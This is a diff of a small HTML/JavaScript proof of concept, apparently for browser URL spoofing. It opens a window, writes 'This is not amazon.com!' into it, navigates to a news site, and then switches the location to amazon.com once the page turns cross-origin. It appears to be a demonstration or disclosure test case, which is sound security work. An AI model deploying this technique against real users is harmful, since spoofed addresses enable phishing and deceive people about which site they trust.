@@ -1,18 +1,14 @@
 
 <script>
   function next() {
-       alert();
-        w.document.location = "https://www.amazon.com";
-         w.history.go(-1);
-          w.history.go(1);
-
+        w.replace("https://www.amazon.com");
         }
 
   function f() {
     w = window.open("");
     w.document.write('<h2>This is not amazon.com!</h2>');
-    w.location = "http://www.leparisien.fr/laparisienne/actualites/";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+    w.location = "https://www.linternaute.com/actualite/monde/1784275-naufrage-du-grande-america-des-risques-pour-les-cotes-francaises/";
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0); 
   }
 </script>
 
